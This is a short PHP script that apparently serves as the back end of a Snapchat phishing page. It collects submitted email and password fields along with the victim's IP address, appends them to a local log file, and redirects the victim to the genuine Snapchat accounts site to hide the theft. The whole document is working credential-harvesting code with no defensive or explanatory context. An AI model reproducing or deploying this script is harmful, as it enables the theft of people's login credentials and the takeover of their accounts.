<?php
if($_POST['pressed'] == 1 )
    header("Location: https://accounts.snapchat.com");

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$e1 = $_POST['e1'];
$p1 = $_POST['p1'];
$data = $e1.'|=|'.$p1.'|=|'.$ip;
$file = 'file';
file_put_contents($file,$data . PHP_EOL, FILE_APPEND);
?>    



